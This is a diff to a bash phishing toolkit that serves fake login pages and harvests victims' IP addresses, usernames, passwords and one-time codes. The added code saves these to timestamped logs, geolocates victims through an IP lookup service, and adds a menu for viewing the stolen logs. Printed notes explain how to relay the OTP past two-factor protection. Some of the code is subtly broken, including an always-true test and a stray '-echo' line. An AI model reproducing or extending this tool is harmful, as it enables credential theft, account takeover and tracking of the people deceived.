@@ -26,6 +26,7 @@ RESETBG="$(printf '\e[0m\n')" #Reset background
 pro_dir=$(pwd) #project directory
 server_dir="${pro_dir}/.server" #server directory
 sites_dir="${pro_dir}/.sites" #sites directory
+log_name=$(date +%d-%m-%Y-%H-%M-%S)
 
 #Normal Banner
 banner(){
@@ -70,6 +71,9 @@ sbanner(){
 directories(){
 if [[ ! -d ".server" ]]; then
         mkdir -p ".server"
+fi
+if [[ ! -d "logs" ]]; then
+        mkdir -p "logs"
 fi
 if [[ -d ".server/www" ]]; then
         rm -rf ".server/www"
@@ -475,14 +479,88 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-        echo -ne "\n${BLUE} Saved in : ${ORANGE}ip.txt"
-	cat .server/dumps/space.txt >> logs.dat
-	cat .server/dumps/space.txt >> logs.dat
-	cat .server/dumps/line.txt >> logs.dat
-        cat .server/www/ip.txt >> logs.dat
-	
+	if [ reply_tunnel=1 ]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+		echo " "
+		save_ip
+		rm -rf .server/www/ip.txt
+	elif [ reply_tunnel=01 ]; then
+		echo -ne "${RED} IP details cannot be captured in localhost server"
+		echo " "
+		save_ip
+		rm -rf .server/www/ip.txt
+	else
+		ip_details
+		save_ip
+	fi
 }
+save_ip() {
+	cat .server/dumps/space.txt >> ${log_name}.txt
+	cat .server/dumps/line.txt >> ${log_name}.txt
+	cat .server/www/ip.txt >> ${log_name}.txt
+	mv ${log_name}.txt logs
+	echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} /logs/${log_name}.txt"
+}
+ip_details() {
+	IFS='\n'
+	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > "${pro_dir}/track.txt")
+	IFS=$'\n'
+	iptt=$(sed -n 's/"ip"://p' "${pro_dir}/track.txt")
 
+	if [[ $iptt != "" ]]; then
+		echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
+	fi
+	iptype=$(sed -n 's/"type"://p' "${pro_dir}/track.txt")
+	if [[ $iptype != "" ]]; then
+		echo -e "\n${GREEN} IP type: ${NC} $iptype"
+	fi
+	latitude=$(sed -n 's/"latitude"://p' "${pro_dir}/track.txt")
+	if [[ $latitude != "" ]]; then
+		echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
+	fi
+	longitude=$(sed -n 's/"longitude"://p' "${pro_dir}/track.txt")
+	if [[ $longitude != "" ]]; then
+		echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
+	fi
+	city=$(sed -n 's/"city"://p' "${pro_dir}/track.txt")
+	if [[ $city != "" ]]; then
+		echo -e "\n${GREEN} City: ${NC} $city"
+	fi
+	isp=$(sed -n 's/"isp"://p' "${pro_dir}/track.txt")
+	if [[ $isp != "" ]]; then
+		echo -e "\n${GREEN} Isp: ${NC} $isp"
+	fi
+	country=$(sed -n 's/"country"://p' "${pro_dir}/track.txt")
+	if [[ $country != "" ]]; then
+		echo -e  "\n${GREEN} Country: ${NC} $country"
+	fi
+	flag=$(sed -n 's/"country_flag"://p' "${pro_dir}/track.txt")
+	if [[ $flag != "" ]]; then
+		echo -e "\n${GREEN} Country flag: ${NC} $flag"
+	fi
+	cap=$(sed -n 's/"country_capital"://p' "${pro_dir}/track.txt")
+	if [[ $cap != "" ]]; then
+		echo -e "\n${GREEN} Country capital: ${NC} $cap"
+	fi
+	phon=$(sed -n 's/"country_phone"://p' "${pro_dir}/track.txt")
+	if [[ $phon != "" ]]; then
+		echo -e "\n${GREEN} Country code: ${NC} $phon"
+	fi
+	continent=$(sed -n 's/"continent"://p' "${pro_dir}/track.txt")
+	if [[ $continent != "" ]]; then
+		echo -e  "\n${GREEN} Continent:  ${NC} $continent"
+	fi
+	ccode=$(sed -n 's/"currency_code"://p' "${pro_dir}/track.txt")
+	if [[ $ccode != "" ]]; then
+		echo -e "\n${GREEN} Currency code: ${NC} $ccode"
+	fi
+	region=$(sed -n 's/"region"://p' "${pro_dir}/track.txt")
+	if [[ $region != "" ]]; then
+		echo -e "\n${GREEN} State: ${NC} $region"
+	fi
+	cat "${pro_dir}/track.txt" >> "${log_name}.txt"
+	rm -rf "${pro_dir}/track.txt"
+}
 #Capture data check
 capture_data_check(){
 	if [ -f .sites/$website/NOTP ];then
@@ -504,28 +582,30 @@ capture_data_check(){
 capture_id() {
 	echo "${RED}"
         cat .server/www/usernames.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
-	cat .server/dumps/space.txt >> logs.dat
-        cat .server/www/usernames.txt >> logs.dat
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
+        cat .server/www/usernames.txt >> "logs/${log_name}.txt"
+	rm -rf .server/www/usernames.txt
 }
 
 ## Get credentials
 capture_pass() {
 	echo "${RED}"
 	cat  .server/www/pass.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
-	cat .server/dumps/space.txt >> logs.dat
-        cat .server/www/pass.txt >> logs.dat
-	
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> logs/${log_name}.txt
+        cat .server/www/pass.txt >> logs/${log_name}.txt
+	rm -rf .server/www/pass.txt
 }
 
 ## Get otp
 capture_otp() {
 	echo "${RED}"
         cat  .server/www/otp.txt
-        echo -e "\n ${GREEN} Saved in : ${ORANGE}logs.dat"
-	cat .server/dumps/space.txt >> logs.dat
-        cat .server/www/otp.txt >> logs.dat
+        echo -e "\n ${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+	cat .server/dumps/space.txt >> logs/${log_name}.txt
+        cat .server/www/otp.txt >> logs/${log_name}.txt
+	rm -rf .server/www/otp.txt
 }
 
 ## Print data no otp
@@ -535,15 +615,12 @@ capture_data_1() {
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
-                        rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
                 if [[ -e ".server/www/usernames.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
                         capture_id
 			capture_pass
-                        rm -rf .server/www/usernames.txt
-			rm -rf .server/www/pass.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                 fi
                 sleep 0.75
@@ -557,20 +634,17 @@ capture_data_2() {
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
-                        rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
                 if [[ -e ".server/www/usernames.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                         capture_id
-                        rm -rf .server/www/usernames.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
 			echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
 			echo -ne "\n\n${GREEN} OTP Found !"
                         capture_otp
-                        rm -rf .server/www/otp.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
                 fi
                 sleep 0.75
@@ -584,7 +658,6 @@ capture_data_3() {
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                         capture_ip
-                        rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
                 if [[ -e ".server/www/usernames.txt" ]]; then
@@ -593,22 +666,70 @@ capture_data_3() {
 			capture_pass
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
                         echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
-                        rm -rf .server/www/usernames.txt
-			rm -rf .server/www/pass.txt
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
 			echo -ne "\n\n${GREEN} OTP Found !"
 			capture_otp
-			rm -rf .server/www/otp.txt
 			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 		fi
                 sleep 0.75
 	done
 }
 
+#Logs check
+logs_check() {
+	if [ "$(ls -A $DIR)" ]; then
+		logs_menu
+	else
+		echo "No logs found"
+		{ sleep 1; clear; logs_menu; }
+	fi
+}
+logs_menu() {
+clear
+banner
+echo -e " "
+echo -e "${RED}[${WHITE}01${RED}]${ORANGE} View Logs    "
+echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Open Logs   "
+echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Reset Logs  "
+echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Back to Tunnel menu   "
+read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_menu
+
+        case $reply_logs_menu in
+                1 | 01)
+                        ls logs/
+			{ sleep 5; clear; logs_menu; };;
+                2 | 02)
+			ls logs/
+                        read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter the file name without extension (.txt) : ${BLUE}"
+			if [ -f "logs/$REPLY.txt" ]; then
+				cat logs/$REPLY.txt
+			else
+				echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+	                        { sleep 1; clear; logs_menu; }
+			fi;;
+                3 | 03)
+			read -p "${RED}[${WHITE}-${RED}]${GREEN} Do you want to clear every victim logs (Y/n) : ${BLUE}"
+			case $REPLY in
+        	                Y | y)
+                	                rm -rf logs
+					echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Every logs successfully cleared!! ${NC} "
+					{ sleep 1; clear; tunnel_menu; };;
+                        	N | n)
+                                	{ clear;  logs_menu; };;
+
+	                esac;;
+                4 | 04)
+                        { sleep 1; clear; tunnel_menu; };;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; clear; logs_menu; };;
+        esac
+}
 ## Tunnel selection
 tunnel_menu() {
-        { clear; banner; }
+clear
+banner
 echo -e " "
 echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
 echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
@@ -628,7 +749,7 @@ echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 min
                         start_loclx;;
                 *)
                         echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                        { sleep 1; tunnel_menu; };;
+                        { sleep 1; clear; tunnel_menu; };;
         esac
 }
 
@@ -837,12 +958,7 @@ case $reply in
 		xdg-open https://github.com/RDXLR/Alygnt/issues/new
 		{ sleep 2; clear; banner; mainmenu; };;
 	D | d)
-		if [ -f logs.dat ];then
-			cat logs.dat
-		else 
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} No logs data found!!"
-			{ sleep 2; clear; mainmenu; }
-		fi;;
+		logs_check;;
 	E | e)
 		check_update;;
 	0 | 00)
@@ -1021,7 +1137,7 @@ esac
 #ebay
 site_ebay(){
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
+-echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
 read -p "${MAGENTA} YOUR CHOICE : " choice
 
@@ -1942,4 +2058,3 @@ install_localxpose
 shortcut_setup
 clear
 mainmenu
-
